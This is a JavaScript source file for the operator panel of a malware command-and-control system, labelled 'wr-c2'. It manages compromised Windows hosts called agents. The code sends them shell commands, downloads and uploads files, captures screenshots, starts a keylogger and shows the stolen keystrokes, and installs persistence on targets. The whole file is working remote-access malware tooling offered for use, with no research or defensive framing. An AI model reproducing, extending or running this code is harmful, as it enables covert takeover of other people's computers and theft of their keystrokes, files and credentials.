/* wr-c2 panel */
(() => {
  const $ = (s) => document.querySelector(s);
  const $$ = (s) => [...document.querySelectorAll(s)];

  const S = {
    agents: [],
    sel: null,
    ws: null,
    pending: new Map(),
    history: [],
    hIndex: -1,
    keylogOpen: false,
  };

  // ---------------- helpers ----------------
  async function api(path, opts = {}) {
    const res = await fetch(path, { credentials: 'same-origin', ...opts });
    if (res.status === 401) { location.href = '/login'; throw new Error('auth'); }
    if (!res.ok) {
      let msg = res.statusText;
      try { msg = (await res.json()).detail || msg; } catch {}
      throw new Error(msg);
    }
    const ct = res.headers.get('content-type') || '';
    return ct.includes('json') ? res.json() : res.text();
  }

  function esc(s) {
    return String(s ?? '').replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
  }

  function toast(msg) {
    const el = $('#toast');
    el.textContent = msg;
    el.classList.add('show');
    clearTimeout(el._t);
    el._t = setTimeout(() => el.classList.remove('show'), 2200);
  }

  function bytes(n) {
    if (n < 1024) return n + ' B';
    if (n < 1048576) return (n / 1024).toFixed(1) + ' KB';
    return (n / 1048576).toFixed(2) + ' MB';
  }

  function ago(ts) {
    if (!ts) return '—';
    const d = Math.max(0, Date.now() / 1000 - ts);
    if (d < 60) return Math.floor(d) + 's ago';
    if (d < 3600) return Math.floor(d / 60) + 'm ago';
    if (d < 86400) return Math.floor(d / 3600) + 'h ago';
    return Math.floor(d / 86400) + 'd ago';
  }

  function term(text, cls = 'out') {
    const box = $('#terminal');
    const atBottom = box.scrollTop + box.clientHeight >= box.scrollHeight - 40;
    const line = document.createElement('div');
    line.className = 'l ' + cls;
    line.textContent = text;
    box.appendChild(line);
    if (atBottom) box.scrollTop = box.scrollHeight;
    while (box.childElementCount > 3000) box.removeChild(box.firstChild);
  }

  // ---------------- agents ----------------
  async function loadAgents() {
    try {
      const { agents } = await api('/api/agents');
      S.agents = agents;
      renderAgents();
      const online = agents.filter((a) => a.online).length;
      $('#onlineCount').textContent = online;
      $('#totalCount').textContent = agents.length;
    } catch (e) { /* offline */ }
  }

  function renderAgents() {
    const box = $('#agentList');
    if (!S.agents.length) {
      box.innerHTML = '<div class="empty">no agents</div>';
      return;
    }
    box.innerHTML = S.agents.map((a) => `
      <div class="agent ${a.id === S.sel ? 'active' : ''}" data-id="${esc(a.id)}">
        <span class="led ${a.online ? 'on' : ''}"></span>
        <span class="txt">
          <span class="h">${esc(a.host || 'unknown')}${a.admin ? '<span class="tag">admin</span>' : ''}</span>
          <span class="s">${esc(a.user || '')} · ${esc(shortOs(a.os))} · ${a.online ? 'live' : ago(a.last_seen)}</span>
        </span>
      </div>`).join('');

    box.querySelectorAll('.agent').forEach((el) =>
      el.addEventListener('click', () => select(el.dataset.id)));
  }

  function shortOs(os) {
    if (!os) return '?';
    const m = String(os).match(/Windows\s+\d+|Windows\s+\w+/i);
    return m ? m[0] : String(os).slice(0, 22);
  }

  async function select(id) {
    S.sel = id;
    S.keylogOpen = false;
    renderAgents();
    const data = await api('/api/agents/' + encodeURIComponent(id));
    const a = data.agent;
    $('#welcome').classList.add('hidden');
    $('#work').classList.remove('hidden');
    $('#terminal').innerHTML = '';
    $('#aHost').textContent = a.host || 'unknown';
    $('#aUser').textContent = a.user || '—';
    $('#aOs').textContent = a.os || '—';
    $('#aPid').textContent = a.pid ? 'pid ' + a.pid : '';
    $('#aAdmin').classList.toggle('hidden', !a.admin);
    $('#keylogOut').textContent = '';
    $('#sysOut').textContent = '';
    $('#rawOut').textContent = '';

    term(`session opened · ${a.host} · ${a.online ? 'live' : 'offline (' + ago(a.last_seen) + ')'}`, 'sys');
    for (const c of [...data.commands].reverse()) {
      if (c.status !== 'done' || !c.body) continue;
      try { renderBody(JSON.parse(c.body), c.module, true); } catch {}
    }
    renderFiles(data.files || []);
    loadKeylogs(id);
  }

  // ---------------- commands ----------------
  async function run(module, args = {}, label = null) {
    if (!S.sel) return;
    try {
      const { id } = await api(`/api/agents/${encodeURIComponent(S.sel)}/cmd`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ module, args }),
      });
      S.pending.set(id, { module, label });
      if (label) term(label, 'cmd');
      else if (module === 'shell') term(args.cmd || '', 'cmd');
    } catch (e) {
      term(e.message, 'err');
    }
  }

  function renderBody(body, module, replay = false) {
    if (body.stdout) term(body.stdout.replace(/\s+$/, ''), 'out');
    if (body.stderr) term(body.stderr.replace(/\s+$/, ''), 'err');
    if (!body.ok && body.error) term(body.error, 'err');

    if (body.meta && Object.keys(body.meta).length) {
      $('#rawOut').textContent = JSON.stringify(body.meta, null, 2);
      if (module === 'sysinfo') {
        $('#sysOut').textContent = body.stdout || JSON.stringify(body.meta, null, 2);
        showTab('sys');
      }
      if (module === 'ls' && body.meta.entries) renderEntries(body.meta.entries);
    }
    if (body.data) {
      try {
        const txt = atob(body.data);
        term(txt, 'out');
      } catch {}
    }
  }

  // ---------------- files ----------------
  function renderFiles(files) {
    const box = $('#tab-files');
    $('#fileCount').textContent = files.length;
    if (!files.length) { box.innerHTML = '<div class="empty">no transfers</div>'; return; }
    box.innerHTML = files.map((f) => `
      <div class="fitem">
        <span class="k">${esc(f.kind || 'file')}</span>
        <span class="n" title="${esc(f.path || f.name)}">${esc(f.name)}</span>
        <span class="s">${bytes(f.size)}</span>
        <a class="a" href="/api/files/${esc(f.id)}" target="_blank" rel="noopener">open</a>
      </div>`).join('');
  }

  function renderEntries(entries) {
    const box = $('#tab-files');
    $('#fileCount').textContent = entries.length;
    if (!entries.length) { box.innerHTML = '<div class="empty">empty directory</div>'; return; }
    box.innerHTML = entries.map((e) => `
      <div class="fitem">
        <span class="k">${e.dir ? 'dir' : 'file'}</span>
        <span class="n" title="${esc(e.path || e.name)}">${esc(e.name)}</span>
        <span class="s">${e.dir ? '' : bytes(e.size || 0)}</span>
      </div>`).join('');
    showTab('files');
  }

  // ---------------- keylog ----------------
  function appendKeylog(text) {
    const pre = $('#keylogOut');
    pre.textContent += text;
    if (pre.textContent.length > 400000) pre.textContent = pre.textContent.slice(-300000);
    pre.scrollTop = pre.scrollHeight;
    if (!S.keylogOpen) { S.keylogOpen = true; showTab('keys'); }
  }

  async function loadKeylogs(id) {
    try {
      const { logs } = await api(`/api/agents/${encodeURIComponent(id)}/keylogs`);
      $('#keylogOut').textContent = logs.map((l) => l.text).join('');
      const pre = $('#keylogOut');
      pre.scrollTop = pre.scrollHeight;
    } catch {}
  }

  // ---------------- tabs ----------------
  function showTab(name) {
    $$('.tab').forEach((t) => t.classList.toggle('active', t.dataset.tab === name));
    $$('.tabpane').forEach((p) => p.classList.toggle('active', p.id === 'tab-' + name));
  }

  // ---------------- toolbar ----------------
  function wireToolbar() {
    $('#toolbar').addEventListener('click', async (ev) => {
      const btn = ev.target.closest('button');
      if (!btn || !S.sel) return;
      const k = btn.dataset.k;

      if (k === 'sysinfo') run('sysinfo', {}, 'sysinfo');
      if (k === 'screenshot') run('screenshot', {}, 'screenshot');
      if (k === 'ls') {
        const p = prompt('list directory', '.');
        if (p) run('ls', { path: p }, `ls ${p}`);
      }
      if (k === 'get') {
        const p = prompt('remote file path', 'C:\\Users\\Public\\Desktop\\');
        if (p) run('download', { path: p }, `download ${p}`);
      }
      if (k === 'put') { S.uploadMode = true; $('#filePicker').click(); }
      if (k === 'keylog') {
        showTab('keys');
        run('keylog', { action: 'start' }, 'keylog start');
      }
      if (k === 'persist') {
        if (confirm('install persistence on target?')) run('persist', { action: 'install' }, 'persist install');
      }
      if (k === 'kill') {
        if (confirm('terminate the agent process?')) run('exit', {}, 'exit');
      }
    });
  }

  function wireUpload() {
    $('#filePicker').addEventListener('change', async (ev) => {
      const file = ev.target.files[0];
      ev.target.value = '';
      if (!file || !S.sel) return;
      const remote = prompt('remote path', 'C:\\Users\\Public\\' + file.name);
      if (!remote) return;
      const fd = new FormData();
      fd.append('path', remote);
      fd.append('file', file);
      term(`upload ${file.name} -> ${remote}`, 'cmd');
      try {
        const r = await api(`/api/agents/${encodeURIComponent(S.sel)}/upload`, { method: 'POST', body: fd });
        term(`upload queued · ${r.chunks} chunk(s) · ${bytes(r.size)}`, 'sys');
      } catch (e) { term(e.message, 'err'); }
    });
  }

  function wireConsole() {
    $('#cmdForm').addEventListener('submit', (ev) => {
      ev.preventDefault();
      const cmd = $('#cmdInput').value.trim();
      if (!cmd || !S.sel) return;
      S.history.push(cmd);
      S.hIndex = S.history.length;
      $('#cmdInput').value = '';
      run('shell', { cmd, shell: $('#shell').value }, null);
    });
    $('#cmdInput').addEventListener('keydown', (ev) => {
      if (ev.key === 'ArrowUp') {
        ev.preventDefault();
        if (!S.history.length) return;
        S.hIndex = Math.max(0, S.hIndex - 1);
        $('#cmdInput').value = S.history[S.hIndex] || '';
      } else if (ev.key === 'ArrowDown') {
        ev.preventDefault();
        S.hIndex = Math.min(S.history.length, S.hIndex + 1);
        $('#cmdInput').value = S.history[S.hIndex] || '';
      }
    });
    $$('.tab').forEach((t) => t.addEventListener('click', () => showTab(t.dataset.tab)));
    const drawer = document.querySelector('.drawer');
    const tabbody = document.querySelector('.tabbody');
    let dragging = false, startY = 0, startH = 0;
    tabbody.addEventListener('mousedown', () => {});
    drawer.addEventListener('mousedown', (ev) => {
      if (ev.target.closest('.tabs, .tabpane')) return;
      dragging = true; startY = ev.clientY; startH = drawer.getBoundingClientRect().height;
      document.body.style.userSelect = 'none';
    });
    window.addEventListener('mousemove', (ev) => {
      if (!dragging) return;
      const h = Math.min(520, Math.max(120, startH - (ev.clientY - startY)));
      drawer.style.height = h + 'px';
      drawer.style.flexBasis = h + 'px';
    });
    window.addEventListener('mouseup', () => { dragging = false; document.body.style.userSelect = ''; });
  }

  // ---------------- websocket ----------------
  function connect() {
    const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const ws = new WebSocket(`${proto}//${location.host}/panel/ws`);
    S.ws = ws;

    ws.onopen = () => {
      $('#linkState').textContent = 'online';
      $('#linkState').className = 'pill on';
    };
    ws.onclose = () => {
      $('#linkState').textContent = 'offline';
      $('#linkState').className = 'pill off';
      setTimeout(connect, 2500);
    };
    ws.onerror = () => ws.close();
    ws.onmessage = (ev) => {
      let m;
      try { m = JSON.parse(ev.data); } catch { return; }

      if (m.t === 'agent') {
        loadAgents();
        if (m.agent && m.agent.id === S.sel && !m.agent.removed) {
          if (m.agent.online === false) term('agent disconnected', 'err');
          else term('agent connected', 'sys');
        }
      }

      if (m.t === 'result') {
        if (m.agent_id !== S.sel) return;
        const p = S.pending.get(m.cmd_id);
        S.pending.delete(m.cmd_id);
        if (p && p.module === 'upload') return;
        renderBody(m.body || {}, p ? p.module : '');
        if (m.body && m.body.ok === false && m.body.error) term('command failed', 'err');
      }

      if (m.t === 'keylog' && m.agent_id === S.sel) appendKeylog(m.text);

      if (m.t === 'file' && m.agent_id === S.sel) {
        term(`file received · ${m.file.name} · ${bytes(m.file.size)}`, 'sys');
        if (m.file.kind === 'screenshot') {
          window.open('/api/files/' + m.file.id, '_blank');
        }
        api(`/api/agents/${encodeURIComponent(S.sel)}`).then((d) => renderFiles(d.files || []));
      }

      if (m.t === 'log' && m.agent_id === S.sel) term(m.text, 'sys');
    };
  }

  // ---------------- boot ----------------
  wireToolbar();
  wireUpload();
  wireConsole();
  loadAgents();
  connect();
  setInterval(loadAgents, 20000);
})();
